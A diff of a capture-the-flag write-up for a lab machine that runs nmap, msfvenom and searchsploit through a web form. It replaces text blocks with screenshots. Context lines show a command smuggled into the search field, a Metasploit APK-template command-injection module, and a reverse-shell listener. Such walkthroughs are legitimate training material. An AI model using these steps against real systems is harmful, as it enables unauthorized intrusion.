@@ -103,36 +103,15 @@ Okay, so we know 2 ports opened, Port 22 SSH and a Port 5000 HTTP port. This Por
 
 ## 2. Port 5000 HTTP Enumeration
 Let's visit `http://10.129.72.251:5000/` and see what we get.
-```
-k1d'5 h4ck3r t00l5
-nmap
-scan top 100 ports on an ip
-ip:
 
-payloads
-venom it up - gen rev tcp meterpreter bins
-os:
-lhost:
-template file (optional):
+![Site1](https://user-images.githubusercontent.com/21957042/113502212-65f53d00-955d-11eb-84a0-4c60ed026417.png)
 
-sploits
-searchsploit FTW
-search:
-```
 Ah, a website that basically runs NMAP, MSFVenom, & SearchSploit for you. So theoritically, this web interface is directly connected to a actual Kali Linux machine? If badly configured, we can run direct commands to it! 
 
 Anyways, let's try one of them NMAP. We will scan itself, META AF.
-```
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-07 04:43 UTC
-Nmap scan report for 10.129.72.251
-Host is up (0.00019s latency).
-Not shown: 98 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-5000/tcp open  upnp
 
-Nmap done: 1 IP address (1 host up) scanned in 10.71 seconds
-```
+![NMAP](https://user-images.githubusercontent.com/21957042/113502211-655ca680-955d-11eb-8da6-e5156f39ef62.png)
+
 It worked!
 
 While we're at it, we run a quick GoBuster to see what we get.
@@ -263,6 +242,8 @@ search=werkzeug%3Bpwd&action=searchsploit
 ```
 This time however, we get an error `stop hacking me - well hack you back`.
 
+![Stop](https://user-images.githubusercontent.com/21957042/113502213-65f53d00-955d-11eb-9c7b-0f7535656803.png)
+
 ## 4. Port 5000 HTTP Attack Attempt 2
 With clues from online, it turns out that I needed more SearchSploits.
 ```
@@ -356,13 +337,9 @@ msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > e
 Interesting! This generates a `.apk` file! 
 
 We go back to `http://10.129.72.251:5000/` and upload this `.apk` file.
-```
-payloads
-venom it up - gen rev tcp meterpreter bins
-os: android
-lhost: 1.2.3.4
-template file (optional): msf.apk
-```
+
+![msf](https://user-images.githubusercontent.com/21957042/113502209-642b7980-955d-11eb-82d0-0541ea99fb0e.png)
+
 Before we run it, we also start a listener.
 ```
 msf6 > use exploit/multi/handler
